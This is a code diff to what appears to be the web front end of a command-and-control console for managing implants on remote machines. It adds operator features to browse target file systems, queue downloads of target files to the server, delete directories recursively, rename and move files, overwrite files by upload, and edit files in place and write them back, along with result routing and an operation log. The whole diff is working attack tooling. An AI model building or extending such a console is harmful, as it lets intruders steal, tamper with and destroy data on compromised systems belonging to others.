@@ -72,6 +72,12 @@ const state = {
   liteBeacons: [],
   liteTab: "term",
   liteDir: "",
+  liteSelPath: "",
+  liteList: [],
+  liteFileTasks: {},
+  goSelPath: "",
+  grabEditOpen: false,
+  grabReload: null,
   aliases: {},
   targetNote: "",
   aliasEditing: false,
@@ -524,10 +530,19 @@ function renderResult(action, result) {
 }
 
 async function renderFiles(box) {
+  const asyncTarget = state.selected.kind === "beacon";
   box.innerHTML = `<div class="panel">
-    <form id="ls-form" class="row"><label>路径<input id="file-path" value="${esc(state.cwd)}"></label><button type="submit">打开</button></form>
+    <form id="ls-form" class="row"><label>路径<input id="file-path" value="${esc(state.cwd)}"></label><button type="submit">打开</button><button type="button" class="ghost" id="file-mkdir">新建文件夹</button><button type="button" class="ghost danger" id="file-del" disabled>删除选中</button><button type="button" class="ghost" id="file-rename" disabled>改名/移动选中</button></form>
     <form id="up-form" class="row"><label>上传到<input id="up-path" placeholder="/tmp/file"></label><input id="up-file" type="file"><button type="submit">上传</button></form>
-    <div id="file-list"></div><p id="file-note" class="hint"></p></div>`;
+    <div id="file-list"></div>
+    <div id="go-editor" class="hidden"></div>
+    <p id="file-note" class="hint">${asyncTarget ? "定时回来的机器：编辑取回内容要走异步任务，暂不支持在线编辑。" : ""}</p></div>`;
+  let goFiles = [];
+  const syncButtons = () => {
+    const has = !!state.goSelPath;
+    $("file-del").disabled = !has;
+    $("file-rename").disabled = !has;
+  };
   const load = async (path) => {
     state.cwd = path || ".";
     $("file-path").value = state.cwd;
@@ -540,28 +555,66 @@ async function renderFiles(box) {
         return;
       }
       const files = result.Files || [];
-      $("file-list").innerHTML = table(["名称", "大小", "权限", "修改时间", ""], files.map((file) => {
+      goFiles = files;
+      state.goSelPath = "";
+      syncButtons();
+      $("file-list").innerHTML = table(["名称", "大小", "权限", "修改时间", "操作"], files.map((file) => {
         const full = joinPath(state.cwd, file.Name);
-        return `<tr class="files"><td class="fname" data-name="${esc(file.Name)}" data-dir="${file.IsDir}">${esc(file.Name)}${file.IsDir ? "/" : ""}</td><td>${esc(file.Size)}</td><td>${esc(file.Mode)}</td><td>${when(file.ModTime)}</td><td>${file.IsDir ? "" : `<button class="mini" data-dl="${esc(full)}">下载</button>`}</td></tr>`;
+        const editable = !asyncTarget && !file.IsDir && ["json", "text"].includes(grabKind(file.Name)) && file.Size <= 1 << 20;
+        return `<tr class="files"><td class="fname" data-name="${esc(file.Name)}" data-dir="${file.IsDir}">${esc(file.Name)}${file.IsDir ? "/" : ""}</td><td>${esc(file.Size)}</td><td>${esc(file.Mode)}</td><td>${when(file.ModTime)}</td><td>${file.IsDir ? "" : `<button class="mini" data-dl="${esc(full)}">下载</button>${editable ? ` <button class="mini" data-edit="${esc(full)}">编辑</button>` : ""}`}</td></tr>`;
       }));
       $("file-note").textContent = result.Path || "";
       $("file-list").querySelectorAll("td.fname").forEach((cell) => {
         cell.onclick = () => {
           const next = joinPath(state.cwd, cell.dataset.name);
-          if (cell.dataset.dir === "true") load(next);
-          else {
-            $("file-list").querySelectorAll("tr.files").forEach((row) => row.classList.remove("sel"));
-            cell.closest("tr").classList.add("sel");
-            $("file-note").textContent = "已选中 " + cell.dataset.name + "，点右侧「下载」才会传输。";
-          }
+          if (cell.dataset.dir === "true") { load(next); return; }
+          $("file-list").querySelectorAll("tr.files").forEach((row) => row.classList.remove("sel"));
+          cell.closest("tr").classList.add("sel");
+          state.goSelPath = next;
+          syncButtons();
+          $("file-note").textContent = "已选中 " + next + "。";
         };
       });
       $("file-list").querySelectorAll("button[data-dl]").forEach((btn) => {
         btn.onclick = (event) => { event.stopPropagation(); taskDownload(btn.dataset.dl); };
       });
+      $("file-list").querySelectorAll("button[data-edit]").forEach((btn) => {
+        btn.onclick = (event) => { event.stopPropagation(); openGoEditor(btn.dataset.edit, goFiles); };
+      });
     } catch (err) {
       $("file-note").textContent = err.message;
     }
+  };
+  $("file-mkdir").onclick = async () => {
+    const name = prompt("新文件夹名：");
+    if (!name) return;
+    try {
+      await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "mkdir", path: joinPath(state.cwd, name) } });
+      $("file-note").textContent = asyncTarget ? "已下发建目录，等下次回连。" : "已创建。";
+      if (!asyncTarget) load(state.cwd);
+    } catch (err) { $("file-note").textContent = err.message; }
+  };
+  $("file-del").onclick = async () => {
+    const entry = goFiles.find((item) => joinPath(state.cwd, item.Name) === state.goSelPath);
+    if (!entry) return;
+    if (!confirm("确认删除 " + state.goSelPath + (entry.IsDir ? " 整个目录（递归）？" : " ？"))) return;
+    try {
+      await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "rm", path: state.goSelPath, recursive: entry.IsDir } });
+      $("file-note").textContent = asyncTarget ? "已下发删除，等下次回连。" : "已删除。";
+      if (!asyncTarget) load(state.cwd);
+    } catch (err) { $("file-note").textContent = err.message; }
+  };
+  $("file-rename").onclick = async () => {
+    const entry = goFiles.find((item) => joinPath(state.cwd, item.Name) === state.goSelPath);
+    if (!entry) return;
+    const name = prompt("新名字或完整新路径：", entry.Name);
+    if (!name) return;
+    const dst = name.includes("/") ? name : joinPath(liteParentDir(state.goSelPath), name);
+    try {
+      await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "mv", path: state.goSelPath, dst } });
+      $("file-note").textContent = asyncTarget ? "已下发改名/移动，等下次回连。" : "已完成。";
+      if (!asyncTarget) load(state.cwd);
+    } catch (err) { $("file-note").textContent = err.message; }
   };
   $("ls-form").onsubmit = (event) => { event.preventDefault(); load($("file-path").value); };
   $("up-form").onsubmit = async (event) => {
@@ -968,7 +1021,7 @@ function applyLiteResults(results) {
 }
 
 async function pollLiteConsole() {
-  if (state.page !== "implants" || !state.liteSelected || !$("lite-input") || state.liteBusy) return;
+  if (state.page !== "implants" || !state.liteSelected || state.liteBusy) return;
   state.liteBusy = true;
   try {
     const [beacons, data] = await Promise.all([
@@ -981,7 +1034,7 @@ async function pollLiteConsole() {
       render();
       return;
     }
-    applyLiteResults(data.Results || []);
+    routeLiteResults(data.Results || []);
     updateLiteHb();
     const prompt = $("lite-prompt");
     const b = liteBeacon(state.liteSelected);
@@ -992,6 +1045,86 @@ async function pollLiteConsole() {
   } finally {
     state.liteBusy = false;
   }
+}
+
+// 结果分流：登记过用途的 read 结果给文件页（编辑器取内容），fs 结果给
+// 文件页的操作提示，其余进终端。
+function routeLiteResults(results) {
+  if (!results.length) return;
+  const routed = [];
+  for (const result of results) {
+    const pending = state.liteFileTasks[result.TaskID];
+    if (pending) {
+      delete state.liteFileTasks[result.TaskID];
+      handleFileTaskResult(result, pending);
+      continue;
+    }
+    if (result.Kind === "fs") {
+      handleFsOutcome(result);
+      continue;
+    }
+    routed.push(result);
+  }
+  if (routed.length) applyLiteResults(routed);
+}
+
+const fsErrText = ["成功", "目标不存在", "没有权限", "超过 20MB", "目标机上的文件已变化，请刷新后重试", "已存在同名文件", "是目录，需要递归删除", "操作失败", "植入体长时间没有回应，任务作废"];
+
+function fsOpName(op) {
+  return { write: "写回", rm: "删除", mv: "改名/移动", mkdir: "新建目录" }[op] || op;
+}
+
+function handleFsOutcome(result) {
+  const label = fsOpName(result.Op) + " " + (result.Path || "");
+  const text = result.Err ? label + "失败：" + (result.Msg || fsErrText[result.Err] || "错误 " + result.Err)
+                          : label + "完成";
+  const note = $("lite-dir-note") || $("grab-note");
+  if (note) note.textContent = text;
+  if (!result.Err && $("lite-dir-list") && state.liteSelected) loadLiteDir(state.liteDir, true);
+  if (!result.Err && $("grab-list")) {
+    const pane = $("grab-preview");
+    if (pane) { pane.innerHTML = ""; state.grabEditOpen = false; }
+    refreshGrabList();
+  }
+}
+
+function handleFileTaskResult(result, pending) {
+  const errs = ["", "文件不存在", "没有权限", "文件太大，上限 20MB", "传输中断，请整次重来"];
+  if (pending.purpose === "editor") {
+    const note = $("lite-dir-note") || $("grab-note");
+    if (result.Err) {
+      if (note) note.textContent = "取回失败：" + (errs[result.Err] || "错误 " + result.Err);
+      closeLiteEditor();
+      return;
+    }
+    openLiteEditorWithData(pending.path, bytesOf(result.Output));
+    return;
+  }
+  // 普通下载：存到浏览器，同时留档已在服务端完成
+  if (result.Err) {
+    const note = $("lite-dir-note");
+    if (note) note.textContent = "下载失败：" + (errs[result.Err] || "错误 " + result.Err);
+    return;
+  }
+  const data = bytesOf(result.Output);
+  const name = fileNameOf(result.Path) || "file.bin";
+  downloadBlob(new Blob([data]), name);
+  const note = $("lite-dir-note");
+  if (note) note.textContent = `已开始下载 ${name}（${data.length} 字节），服务端也已留档。`;
+}
+
+// UTF-8 安全的 base64（编辑器写回用）。
+function b64OfBytes(bytes) {
+  let bin = "";
+  const step = 0x8000;
+  for (let i = 0; i < bytes.length; i += step) {
+    bin += String.fromCharCode.apply(null, bytes.subarray(i, i + step));
+  }
+  return btoa(bin);
+}
+
+function b64OfText(text) {
+  return b64OfBytes(new TextEncoder().encode(text));
 }
 
 function bindLiteShell(b) {
@@ -1332,6 +1465,207 @@ function liteParentDir(path) {
   return p.slice(0, idx);
 }
 
+function loadLiteDir(path, force) {
+  state.liteDir = path || ".";
+  const input = $("lite-dir-path");
+  if (input) input.value = state.liteDir;
+  const note = $("lite-dir-note");
+  if (note) note.textContent = "等待回连…";
+  return api("/api/lite/ls", { method: "POST", json: { beaconId: state.liteSelected, path: state.liteDir, force: !!force } })
+    .then(() => checkLiteDir())
+    .catch((err) => { if (note) note.textContent = err.message; });
+}
+
+async function checkLiteDir() {
+  if (state.liteTab !== "files" || !state.liteSelected) return;
+  try {
+    const data = await api("/api/lite/ls?beacon=" + encodeURIComponent(state.liteSelected) + "&path=" + encodeURIComponent(state.liteDir));
+    if (data.pending) {
+      const note = $("lite-dir-note");
+      if (note) note.textContent = "等待回连…（结果会随心跳回来）";
+      return;
+    }
+    if (!data.listing) {
+      const note = $("lite-dir-note");
+      if (note) note.textContent = "这台植入体还没回应列目录，稍后再点「刷新」。";
+      return;
+    }
+    paintLiteDir(data.listing);
+  } catch (err) {
+    const note = $("lite-dir-note");
+    if (note) note.textContent = err.message;
+  }
+}
+
+function liteSelEntry() {
+  return (state.liteList || []).find((entry) => joinPath(state.liteDir, entry.Name) === state.liteSelPath);
+}
+
+function paintLiteDir(listing) {
+  const list = $("lite-dir-list");
+  const note = $("lite-dir-note");
+  if (!list || !note) return;
+  if (listing.Err) {
+    list.innerHTML = "";
+    state.liteList = [];
+    note.textContent = ["", "目录不存在", "没有权限打开", "这是文件不是目录"][listing.Err] || "列目录失败 " + listing.Err;
+    return;
+  }
+  const entries = listing.Entries || [];
+  state.liteList = entries;
+  state.liteSelPath = "";
+  list.innerHTML = table(["名称", "大小", "修改时间", "操作"], entries.map((entry) => {
+    const full = joinPath(state.liteDir, entry.Name);
+    const editable = !entry.IsDir && ["json", "text"].includes(grabKind(entry.Name)) && entry.Size <= 2 << 20;
+    const ops = entry.IsDir
+      ? ""
+      : `<button class="mini" data-dl="${esc(full)}">下载</button>${editable ? ` <button class="mini" data-edit="${esc(full)}">编辑</button>` : ""}`;
+    return `<tr class="files"><td class="fname" data-name="${esc(entry.Name)}" data-dir="${entry.IsDir}">${esc(entry.Name)}${entry.IsDir ? "/" : ""}</td><td>${entry.IsDir ? "—" : esc(entry.Size)}</td><td>${when(entry.ModTime)}</td><td>${ops}</td></tr>`;
+  }));
+  note.textContent = (listing.Truncated ? "目录太大，只显示了前一部分；" : "") + "点目录进入；点行选中后可删除/改名；点「下载」或「编辑」才会传输。";
+  list.querySelectorAll("td.fname").forEach((cell) => {
+    cell.onclick = () => {
+      if (cell.dataset.dir === "true") { loadLiteDir(joinPath(state.liteDir, cell.dataset.name), false); return; }
+      selectLiteRow(cell.closest("tr"), joinPath(state.liteDir, cell.dataset.name));
+    };
+  });
+  list.querySelectorAll("button[data-dl]").forEach((btn) => {
+    btn.onclick = (event) => {
+      event.stopPropagation();
+      queueLiteDownload(btn.dataset.dl);
+    };
+  });
+  list.querySelectorAll("button[data-edit]").forEach((btn) => {
+    btn.onclick = (event) => {
+      event.stopPropagation();
+      queueLiteEditorLoad(btn.dataset.edit);
+    };
+  });
+}
+
+function selectLiteRow(row, fullPath) {
+  const list = $("lite-dir-list");
+  if (list) list.querySelectorAll("tr.files").forEach((tr) => tr.classList.remove("sel"));
+  if (row) row.classList.add("sel");
+  state.liteSelPath = fullPath;
+  const note = $("lite-dir-note");
+  if (note) note.textContent = "已选中 " + fullPath + "。";
+}
+
+function queueLiteDownload(path) {
+  return api("/api/lite/task", { method: "POST", json: { beaconId: state.liteSelected, type: "read", path } })
+    .then((res) => {
+      state.liteFileTasks[res.taskId] = { purpose: "download", path };
+      const note = $("lite-dir-note");
+      if (note) note.textContent = `已排队下载（任务 ${res.taskId}），传完自动保存并进「拿回的文件」。`;
+    })
+    .catch((err) => { const note = $("lite-dir-note"); if (note) note.textContent = err.message; });
+}
+
+function queueLiteEditorLoad(path) {
+  return api("/api/lite/task", { method: "POST", json: { beaconId: state.liteSelected, type: "read", path } })
+    .then((res) => {
+      state.liteFileTasks[res.taskId] = { purpose: "editor", path };
+      const note = $("lite-dir-note");
+      if (note) note.textContent = `正在取回 ${path} 的内容（任务 ${res.taskId}）…`;
+    })
+    .catch((err) => { const note = $("lite-dir-note"); if (note) note.textContent = err.message; });
+}
+
+function openLiteEditorWithData(path, bytes) {
+  const pane = $("lite-editor");
+  if (!pane) return;
+  const text = new TextDecoder().decode(bytes);
+  pane.innerHTML = `
+    <h3>编辑 ${esc(path)}</h3>
+    <textarea id="lite-edit-area" spellcheck="false"></textarea>
+    <div class="row">
+      <button type="button" id="lite-edit-save">保存写回</button>
+      <button type="button" class="ghost" id="lite-edit-cancel">取消</button>
+      <span class="hint">保存时校验大小和修改时间，目标机上文件变了会拒绝写回。</span>
+    </div>
+    <p id="lite-edit-note" class="hint"></p>`;
+  $("lite-edit-area").value = text;
+  $("lite-edit-cancel").onclick = closeLiteEditor;
+  $("lite-edit-save").onclick = async () => {
+    const note = $("lite-edit-note");
+    const entry = liteSelEntry() || (state.liteList || []).find((item) => joinPath(state.liteDir, item.Name) === path);
+    note.textContent = "排队写回…";
+    try {
+      const res = await api("/api/lite/fs", { method: "POST", json: {
+        beaconId: state.liteSelected, op: "write", path,
+        content: b64OfText($("lite-edit-area").value),
+        expectSize: entry ? entry.Size : -1,
+        expectMTime: entry ? entry.ModTime : -1,
+      }});
+      note.textContent = "已排队写回（任务 " + res.taskId + "），等心跳确认。";
+    } catch (err) {
+      note.textContent = err.message;
+    }
+  };
+  pane.classList.remove("hidden");
+}
+
+function closeLiteEditor() {
+  const pane = $("lite-editor");
+  if (pane) { pane.innerHTML = ""; pane.classList.add("hidden"); }
+}
+
+// Go 目标的在线编辑：取回（同步会话才有 Data）→ 改 → 走上传覆盖。
+async function openGoEditor(path, files) {
+  const pane = $("go-editor");
+  if (!pane) return;
+  const entry = files.find((item) => joinPath(state.cwd, item.Name) === path);
+  pane.innerHTML = `<p class="hint">正在取回 ${esc(path)} …</p>`;
+  pane.classList.remove("hidden");
+  let result;
+  try {
+    result = await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "download", path } });
+  } catch (err) {
+    pane.innerHTML = `<p class="hint">${esc(err.message)}</p>`;
+    return;
+  }
+  if (result.Response && result.Response.Async) {
+    pane.innerHTML = `<p class="hint">这台机器是定时回来的，取回内容是异步任务，暂不支持在线编辑。</p>`;
+    return;
+  }
+  if (result.Err || !result.Data) {
+    pane.innerHTML = `<p class="hint">取回失败。</p>`;
+    return;
+  }
+  const content = new TextDecoder().decode(bytesOf(result.Data));
+  pane.innerHTML = `
+    <h3>编辑 ${esc(path)}</h3>
+    <textarea id="go-edit-area" spellcheck="false"></textarea>
+    <div class="row">
+      <button type="button" id="go-edit-save">保存写回</button>
+      <button type="button" class="ghost" id="go-edit-cancel">取消</button>
+      <span class="hint">Go 目标保存是直接覆盖，不做冲突校验。</span>
+    </div>
+    <p id="go-edit-note" class="hint"></p>`;
+  $("go-edit-area").value = content;
+  $("go-edit-cancel").onclick = () => { pane.innerHTML = ""; pane.classList.add("hidden"); };
+  $("go-edit-save").onclick = async () => {
+    const note = $("go-edit-note");
+    note.textContent = "上传中…";
+    const data = $("go-edit-area").value;
+    const form = new FormData();
+    form.set("kind", state.selected.kind);
+    form.set("id", state.selected.ID);
+    form.set("path", path);
+    form.set("file", new File([data], fileNameOf(path) || "file.bin"));
+    try {
+      const res = await fetch("/api/upload", { method: "POST", headers: { Authorization: "Bearer " + state.token }, body: form });
+      const type = res.headers.get("content-type") || "";
+      const payload = type.includes("json") ? await res.json() : null;
+      if (!res.ok) throw new Error((payload && payload.error) || "上传失败");
+      note.textContent = result.Response && result.Response.Async ? "已下发，等下次回连。" : "已写回。";
+    } catch (err) {
+      note.textContent = err.message;
+    }
+  };
+}
+
 function renderLiteFiles(box, b) {
   if (!state.liteDir) state.liteDir = ".";
   box.innerHTML = `
@@ -1342,73 +1676,74 @@ function renderLiteFiles(box, b) {
         <button type="submit">打开</button>
         <button type="button" class="ghost" id="lite-dir-refresh">刷新</button>
       </form>
+      <div class="row file-ops">
+        <button type="button" class="ghost" id="lite-mkdir">新建文件夹</button>
+        <label class="mini-upload">上传替换<input id="lite-upload" type="file" hidden></label>
+        <button type="button" class="ghost danger" id="lite-del" disabled>删除选中</button>
+        <button type="button" class="ghost" id="lite-rename" disabled>改名/移动选中</button>
+      </div>
       <div id="lite-dir-list"></div>
+      <div id="lite-editor" class="hidden"></div>
       <p id="lite-dir-note" class="hint"></p>
     </div>`;
-  const dirErrs = ["", "目录不存在", "没有权限打开", "这是文件不是目录"];
-  const paint = (listing) => {
-    if (listing.Err) {
-      $("lite-dir-list").innerHTML = "";
-      $("lite-dir-note").textContent = dirErrs[listing.Err] || "列目录失败 " + listing.Err;
+  $("lite-dir-form").onsubmit = (event) => { event.preventDefault(); loadLiteDir($("lite-dir-path").value.trim() || ".", false); };
+  $("lite-dir-up").onclick = () => loadLiteDir(liteParentDir(state.liteDir), false);
+  $("lite-dir-refresh").onclick = () => loadLiteDir(state.liteDir, true);
+
+  const syncButtons = () => {
+    const has = !!state.liteSelPath;
+    $("lite-del").disabled = !has;
+    $("lite-rename").disabled = !has;
+  };
+  $("lite-mkdir").onclick = async () => {
+    const name = prompt("新文件夹名（在当前目录下创建）：");
+    if (!name) return;
+    try {
+      await api("/api/lite/fs", { method: "POST", json: { beaconId: b.ID, op: "mkdir", path: joinPath(state.liteDir, name) } });
+      $("lite-dir-note").textContent = "已排队新建目录，等心跳确认。";
+    } catch (err) { $("lite-dir-note").textContent = err.message; }
+  };
+  $("lite-del").onclick = async () => {
+    const entry = liteSelEntry();
+    if (!entry) return;
+    if (!confirm("确认删除 " + state.liteSelPath + (entry.IsDir ? " 整个目录？" : " ？"))) return;
+    try {
+      await api("/api/lite/fs", { method: "POST", json: { beaconId: b.ID, op: "rm", path: state.liteSelPath, recursive: entry.IsDir } });
+      $("lite-dir-note").textContent = "已排队删除，等心跳确认。";
+    } catch (err) { $("lite-dir-note").textContent = err.message; }
+  };
+  $("lite-rename").onclick = async () => {
+    const entry = liteSelEntry();
+    if (!entry) return;
+    const name = prompt("新名字（留在当前目录）或完整新路径：", entry.Name);
+    if (!name || name === entry.Name) return;
+    const dst = name.includes("/") ? name : joinPath(liteParentDir(state.liteSelPath), name);
+    try {
+      await api("/api/lite/fs", { method: "POST", json: { beaconId: b.ID, op: "mv", path: state.liteSelPath, dst } });
+      $("lite-dir-note").textContent = "已排队改名/移动，等心跳确认。";
+    } catch (err) { $("lite-dir-note").textContent = err.message; }
+  };
+  $("lite-upload").onchange = async (event) => {
+    const file = event.target.files[0];
+    if (!file) return;
+    if (file.size > 20 * 1024 * 1024) {
+      $("lite-dir-note").textContent = "文件超过 20MB 上限";
+      event.target.value = "";
       return;
     }
-    const entries = listing.Entries || [];
-    $("lite-dir-list").innerHTML = table(["名称", "大小", "修改时间", ""], entries.map((entry) => {
-      const full = joinPath(state.liteDir, entry.Name);
-      return `<tr class="files"><td class="fname" data-name="${esc(entry.Name)}" data-dir="${entry.IsDir}">${esc(entry.Name)}${entry.IsDir ? "/" : ""}</td><td>${entry.IsDir ? "—" : esc(entry.Size)}</td><td>${when(entry.ModTime)}</td><td>${entry.IsDir ? "" : `<button class="mini" data-dl="${esc(full)}">下载</button>`}</td></tr>`;
-    }));
-    $("lite-dir-note").textContent = (listing.Truncated ? "目录太大，只显示了前一部分；" : "") + "点目录进入，点文件旁的「下载」才会传输。";
-    $("lite-dir-list").querySelectorAll("td.fname").forEach((cell) => {
-      cell.onclick = () => {
-        if (cell.dataset.dir === "true") load(joinPath(state.liteDir, cell.dataset.name), false);
-      };
-    });
-    $("lite-dir-list").querySelectorAll("button[data-dl]").forEach((btn) => {
-      btn.onclick = async (event) => {
-        event.stopPropagation();
-        try {
-          const res = await api("/api/lite/task", { method: "POST", json: { beaconId: b.ID, type: "read", path: btn.dataset.dl } });
-          $("lite-dir-note").textContent = `已排队下载（任务 ${res.taskId}），传完会自动保存，并出现在「拿回的文件」。`;
-        } catch (err) {
-          $("lite-dir-note").textContent = err.message;
-        }
-      };
-    });
-  };
-  const check = async () => {
-    if (state.liteTab !== "files" || state.liteSelected !== b.ID) return;
+    const dst = prompt("保存到目标机上的路径：", joinPath(state.liteDir, file.name));
+    if (!dst) { event.target.value = ""; return; }
+    const bytes = new Uint8Array(await file.arrayBuffer());
     try {
-      const data = await api("/api/lite/ls?beacon=" + encodeURIComponent(b.ID) + "&path=" + encodeURIComponent(state.liteDir));
-      if (data.pending) {
-        $("lite-dir-note").textContent = "等待回连…（结果会随心跳回来）";
-        return;
-      }
-      if (!data.listing) {
-        $("lite-dir-note").textContent = "这台植入体还没回应列目录，稍后再点「刷新」。";
-        return;
-      }
-      paint(data.listing);
-    } catch (err) {
-      $("lite-dir-note").textContent = err.message;
-    }
+      await api("/api/lite/fs", { method: "POST", json: {
+        beaconId: b.ID, op: "write", path: dst, force: true, content: b64OfBytes(bytes),
+      }});
+      $("lite-dir-note").textContent = "已排队上传（覆盖写），等心跳确认。";
+    } catch (err) { $("lite-dir-note").textContent = err.message; }
+    event.target.value = "";
   };
-  const load = async (path, force) => {
-    state.liteDir = path || ".";
-    $("lite-dir-path").value = state.liteDir;
-    $("lite-dir-note").textContent = "等待回连…";
-    try {
-      await api("/api/lite/ls", { method: "POST", json: { beaconId: b.ID, path: state.liteDir, force: !!force } });
-    } catch (err) {
-      $("lite-dir-note").textContent = err.message;
-      return;
-    }
-    check();
-  };
-  $("lite-dir-form").onsubmit = (event) => { event.preventDefault(); load($("lite-dir-path").value.trim() || ".", false); };
-  $("lite-dir-up").onclick = () => load(liteParentDir(state.liteDir), false);
-  $("lite-dir-refresh").onclick = () => load(state.liteDir, true);
-  state.liteDirPoll = setInterval(check, 2000);
-  check();
+  state.liteDirPoll = setInterval(checkLiteDir, 2000);
+  loadLiteDir(state.liteDir, false);
 }
 
 const grabTextExts = ["txt", "log", "conf", "cfg", "ini", "yaml", "yml", "toml", "csv", "tsv", "md", "xml", "html", "htm", "css", "js", "ts", "jsx", "tsx", "py", "go", "c", "h", "cpp", "hpp", "java", "rb", "php", "sh", "bash", "ps1", "sql", "env", "properties", "plist", "gitignore", "service", "sock"];
@@ -1427,15 +1762,65 @@ function grabKind(name) {
   return "hex";
 }
 
+function refreshGrabList() {
+  if (state.grabReload) state.grabReload();
+}
+
+function openGrabEditor(targetKey, current) {
+  const pane = $("grab-preview");
+  if (!pane || !current || current.truncated || !current.raw) return;
+  pane.innerHTML = `
+    <div class="preview grab-editor">
+      <div class="grab-head"><b>编辑 ${esc(current.rec.Name)}</b>
+        <button class="ghost" id="grab-edit-save">保存写回</button>
+        <button class="ghost" id="grab-edit-cancel">取消</button>
+      </div>
+      <textarea id="grab-edit-area" spellcheck="false"></textarea>
+      <p id="grab-edit-note" class="hint">保存会直接覆盖目标机上的 ${esc(current.rec.SourcePath)}（此入口不做冲突校验；在「文件」页编辑才有校验）。</p>
+    </div>`;
+  $("grab-edit-area").value = current.raw;
+  $("grab-edit-cancel").onclick = () => { state.grabEditOpen = false; refreshGrabList(); };
+  $("grab-edit-save").onclick = async () => {
+    const note = $("grab-edit-note");
+    note.textContent = "排队写回…";
+    const content = $("grab-edit-area").value;
+    try {
+      if (targetKey.startsWith("lite:")) {
+        await api("/api/lite/fs", { method: "POST", json: {
+          beaconId: targetKey.slice(5), op: "write", path: current.rec.SourcePath,
+          content: b64OfText(content), force: true,
+        }});
+      } else {
+        const [kind, id] = [targetKey.slice(0, targetKey.indexOf(":")), targetKey.slice(targetKey.indexOf(":") + 1)];
+        const form = new FormData();
+        form.set("kind", kind);
+        form.set("id", id);
+        form.set("path", current.rec.SourcePath);
+        form.set("file", new File([content], current.rec.Name || "file.bin"));
+        const res = await fetch("/api/upload", { method: "POST", headers: { Authorization: "Bearer " + state.token }, body: form });
+        if (!res.ok) throw new Error((await res.json().catch(() => ({}))).error || "上传失败");
+      }
+      state.grabEditOpen = true;
+      note.textContent = "已排队写回，等心跳确认。";
+    } catch (err) {
+      note.textContent = err.message;
+    }
+  };
+}
+
 async function renderGrabbed(box, targetKey) {
   box.innerHTML = `
     <div class="panel">
       <h3>拿回的文件</h3>
-      <p class="hint">从这台机器拿回来的文件都留档在服务端，可随时预览或再存到本机。</p>
+      <p class="hint">从这台机器拿回来的文件都留档在服务端，可随时预览、编辑写回或再存到本机。</p>
       <div id="grab-list"></div>
       <div id="grab-preview"></div>
+      <h3>操作记录</h3>
+      <div id="grab-audit"><p class="hint">载入中…</p></div>
     </div>`;
+  state.grabReload = loadList;
   let urls = [];
+  let current = null;
   const freeURLs = () => { urls.forEach((u) => URL.revokeObjectURL(u)); urls = []; };
   const sizeText = (n) => (n >= 1 << 20 ? (n / (1 << 20)).toFixed(1) + " MB" : n >= 1024 ? (n / 1024).toFixed(1) + " KB" : n + " B");
   const preview = async (rec) => {
@@ -1451,8 +1836,9 @@ async function renderGrabbed(box, targetKey) {
     const blob = await res.blob();
     freeURLs();
     const kind = grabKind(rec.Name);
+    const editable = (kind === "json" || kind === "text") && rec.Size <= 1 << 20;
     const head = `<div class="grab-head"><b>${esc(rec.Name)}</b><span class="hint">${sizeText(rec.Size)} · 来自 ${esc(rec.SourcePath)}</span>
-      <button class="ghost" id="grab-save">存到本机</button></div>`;
+      <button class="ghost" id="grab-save">存到本机</button>${editable ? '<button class="ghost" id="grab-edit">编辑</button>' : ""}</div>`;
     let body = "";
     if (kind === "image") {
       const url = URL.createObjectURL(blob);
@@ -1469,12 +1855,14 @@ async function renderGrabbed(box, targetKey) {
         ? `<video controls src="${url}"></video>`
         : `<audio controls src="${url}"></audio>`;
     } else if (kind === "json" || kind === "text") {
-      let text = await blob.text();
-      if (text.length > 1 << 20) text = text.slice(0, 1 << 20) + "\n…（内容太大，只显示前 1MB，存到本机看全文）";
+      const raw = await blob.text();
+      const truncated = raw.length > 1 << 20;
+      let text = truncated ? raw.slice(0, 1 << 20) : raw;
       if (kind === "json") {
         try { text = JSON.stringify(JSON.parse(text), null, 2); } catch { /* 不是合法 JSON，按原文显示 */ }
       }
-      body = `<pre>${esc(text)}</pre>`;
+      body = `<pre>${esc(text)}</pre>` + (truncated ? `<p class="hint">内容太大，只显示前 1MB；要修改请存到本机改完再上传替换。</p>` : "");
+      current = { rec, kind, truncated, raw: truncated ? "" : raw };
     } else {
       const buf = new Uint8Array(await blob.slice(0, 2048).arrayBuffer());
       let hex = "";
@@ -1487,6 +1875,8 @@ async function renderGrabbed(box, targetKey) {
     }
     pane.innerHTML = `<div class="preview">${head}${body}</div>`;
     $("grab-save").onclick = () => downloadBlob(blob, rec.Name || "file.bin");
+    const editBtn = $("grab-edit");
+    if (editBtn) editBtn.onclick = () => openGrabEditor(targetKey, current);
   };
   const loadList = async () => {
     const data = await api("/api/files?target=" + encodeURIComponent(targetKey));
@@ -1517,6 +1907,18 @@ async function renderGrabbed(box, targetKey) {
       };
     });
     if (!files.length) $("grab-list").innerHTML = `<p class="hint">还没有从这台机器拿回文件。</p>`;
+    loadAudit();
+  };
+  const loadAudit = async () => {
+    try {
+      const data = await api("/api/files/audit?target=" + encodeURIComponent(targetKey));
+      const rows = (data.Audit || []).map((row) => `<tr><td>${whenISO(row.At)}</td><td>${esc(fsOpName(row.Op))}</td><td class="mono">${esc(row.Path)}${row.Dst ? " → " + esc(row.Dst) : ""}</td><td>${row.Err ? "失败：" + esc(row.Msg || fsErrText[row.Err] || row.Err) : (esc(row.Msg) || "完成")}</td></tr>`);
+      $("grab-audit").innerHTML = rows.length
+        ? table(["时间", "操作", "路径", "结果"], rows)
+        : `<p class="hint">这台机器还没有文件操作记录。</p>`;
+    } catch (err) {
+      $("grab-audit").innerHTML = `<p class="hint">${esc(err.message)}</p>`;
+    }
   };
   loadList();
 }
